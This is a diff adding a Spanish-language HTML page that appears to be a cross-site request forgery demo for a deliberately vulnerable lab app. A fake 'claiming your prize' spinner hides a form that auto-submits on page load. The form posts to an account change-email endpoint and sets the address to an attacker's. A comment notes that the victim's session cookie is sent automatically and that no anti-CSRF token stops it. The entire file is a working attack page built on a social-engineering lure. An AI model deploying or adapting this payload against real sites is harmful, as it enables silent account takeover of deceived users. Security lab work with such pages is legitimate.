@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reclamando tu premio...</title>
+<style>
+  body { font-family: system-ui, sans-serif; background:#fff4d6; color:#5a3b00; text-align:center;
+         padding:3rem 1rem; }
+  .spin { font-size:4rem; animation:spin 1.2s linear infinite; display:inline-block; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+</style>
+</head>
+<body>
+  <h1>Procesando tu premio&hellip;</h1>
+  <div class="spin">&#127873;</div>
+  <p>Esto toma solo un segundo.</p>
+
+  <!--
+    VARIANTE POST (realista): formulario oculto que se auto-envia al cargar.
+    Hace POST al endpoint vulnerable; la cookie de sesion de la victima viaja
+    sola (SameSite=None en modo vuln) y no hay token anti-CSRF que lo detenga.
+  -->
+  <form id="f" method="post" action="https://192.168.56.10:8001/account/change-email">
+    <input type="hidden" name="new" value="atacante@evil.cl">
+  </form>
+  <script>document.getElementById('f').submit();</script>
+</body>
+</html>
